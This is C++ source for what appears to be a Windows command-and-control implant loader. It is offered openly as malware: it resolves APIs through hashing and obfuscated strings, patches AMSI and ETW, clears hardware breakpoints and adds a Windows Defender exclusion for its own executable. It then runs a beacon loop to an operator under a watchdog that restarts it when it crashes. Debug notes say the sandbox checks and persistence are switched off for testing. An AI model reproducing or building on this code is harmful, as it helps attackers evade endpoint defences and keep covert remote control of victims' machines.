#include <windows.h>
#include <stdio.h>
#include <algorithm>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

static void NtSleep(DWORD ms) {
    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) {
            pfn = reinterpret_cast<NtDelayExecution_t>(
                HashProc(h, FNV("NtDelayExecution")));
        }
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

DWORD WINAPI ImplantThread(LPVOID) {
    printf("[DEBUG] ImplantThread started\n");
    fflush(stdout);

    DecoyLoop();
    printf("[DEBUG] DecoyLoop done\n");
    fflush(stdout);

    // ──────────────────────────────────────────────────────────────
    //  DISABLE SANDBOX CHECK FOR TESTING
    // ──────────────────────────────────────────────────────────────
    printf("[DEBUG] SandboxCheck disabled for testing.\n");
    fflush(stdout);
    /*
    if (SandboxCheck()) {
        printf("[DEBUG] SandboxCheck returned TRUE – sleeping 10 minutes\n");
        fflush(stdout);
        NtSleep(600000);
        return 0;
    }
    */

    printf("[DEBUG] Initializing syscalls...\n");
    fflush(stdout);
    int syscallAttempts = 0;
    while (!InitializeSyscalls()) {
        printf("[DEBUG] InitializeSyscalls failed (attempt %d) – retrying in 5s\n", ++syscallAttempts);
        fflush(stdout);
        NtSleep(5000);
    }
    printf("[DEBUG] InitializeSyscalls succeeded\n");
    fflush(stdout);

    printf("[DEBUG] Patching AMSI...\n");
    fflush(stdout);
    PatchAMSI();
    printf("[DEBUG] Patching ETW...\n");
    fflush(stdout);
    PatchETW();
    printf("[DEBUG] Clearing hardware breakpoints...\n");
    fflush(stdout);
    ClearHardwareBreakpoints();
    printf("[DEBUG] Evasion applied\n");
    fflush(stdout);

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    printf("[DEBUG] Exe path: %S\n", exePath);
    fflush(stdout);

    if (IsElevated()) {
        printf("[DEBUG] Running elevated – adding Defender exclusion\n");
        fflush(stdout);
        AddDefenderExclusion(exePath);
    }

    // ──────────────────────────────────────────────────────────────
    //  SKIP PERSISTENCE – test C2 core
    // ──────────────────────────────────────────────────────────────
    printf("[DEBUG] Skipping persistence installation for testing.\n");
    fflush(stdout);

    printf("[DEBUG] Entering BeaconLoop...\n");
    fflush(stdout);
    BeaconLoop();

    // BeaconLoop only returns on a clean operator 'exit' command.
    // Exit code 0 signals the watchdog to stop restarting.
    printf("[DEBUG] BeaconLoop returned (clean exit)\n");
    fflush(stdout);
    return 0;  // watchdog sees 0 → stop
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    printf("[DEBUG] WinMain entered\n");
    fflush(stdout);

    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return 0;

    auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
    auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
    auto _GetExitCodeThread   = HASHPROC(hKernel32, GetExitCodeThread);
    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        return 0;
    }

    // ── WATCHDOG RESTART LOOP ─────────────────────────────────────────────
    // ImplantThread exits on:
    //   0  — clean operator 'exit' command → we honor it and stop
    //   1+ — crash, exception, or network failure → restart with backoff
    //
    // Backoff schedule: 5s → 10s → 20s → 40s → 60s (capped)
    // ─────────────────────────────────────────────────────────────────────
    DWORD restartCount = 0;

    while (true) {
        if (restartCount > 0) {
            // Exponential backoff capped at 60 seconds
            DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            printf("[DEBUG] Watchdog: restarting ImplantThread in %lus (restart #%lu)\n",
                   backoffMs / 1000, restartCount);
            fflush(stdout);
            Sleep(backoffMs);
        }

        printf("[DEBUG] Watchdog: spawning ImplantThread (restart #%lu)\n", restartCount);
        fflush(stdout);

        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) {
            printf("[DEBUG] Watchdog: CreateThread failed — retrying in 5s\n");
            fflush(stdout);
            Sleep(5000);
            ++restartCount;
            continue;
        }

        _WaitForSingleObject(hThread, INFINITE);

        DWORD exitCode = 0;
        _GetExitCodeThread(hThread, &exitCode);
        _CloseHandle(hThread);

        printf("[DEBUG] Watchdog: ImplantThread exited (code=%lu)\n", exitCode);
        fflush(stdout);

        // Exit code 0 == clean operator 'exit' — respect it
        if (exitCode == 0) {
            printf("[DEBUG] Watchdog: clean exit received — terminating\n");
            fflush(stdout);
            return 0;
        }

        ++restartCount;
    }
}